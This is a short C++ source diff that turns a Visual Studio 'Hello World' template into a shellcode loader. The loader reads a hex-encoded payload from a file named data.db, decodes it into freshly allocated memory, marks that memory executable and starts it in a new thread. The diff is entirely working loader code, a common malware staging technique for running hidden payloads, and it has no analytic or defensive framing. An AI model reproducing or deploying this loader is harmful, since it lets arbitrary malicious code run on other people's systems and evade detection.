@@ -1,21 +1,47 @@
-// lodr.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
-
-#include "pch.h"
+#include <Windows.h>
 #include <iostream>
+#include <fstream>
+#include <sstream>
+
+using namespace std;
+
+void hex_to_ascii(string src, char* dst) {
+	for (u_int i = 0; i < src.length(); i += 2) {
+		dst[i / 2] = (char)strtoul(src.substr(i, 2).c_str(), NULL, 16);
+	}
+}
 
 int main()
 {
-    std::cout << "Hello World!\n"; 
+	std::fstream f("data.db", std::ios::in);
+	if (!f.is_open())
+		return 0;
+
+	std::string buf;
+	f >> buf;
+	
+	// create page
+	char* addr = (char *)VirtualAlloc(NULL, buf.length() / 2, MEM_COMMIT, PAGE_READWRITE);
+	if (!addr)
+		return 0;
+
+	// copy data
+	hex_to_ascii(buf, addr);
+
+	// change perms
+	DWORD old;
+	if (!VirtualProtect(addr, buf.length() / 2, PAGE_EXECUTE_READ, &old))
+		return 0;
+
+	// create thread
+	DWORD tid;
+	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &tid);
+	if (!t)
+		return 0;
+
+	// wait
+	WaitForSingleObject(t, INFINITE);
+
+	return 0;
 }
 
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
-
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
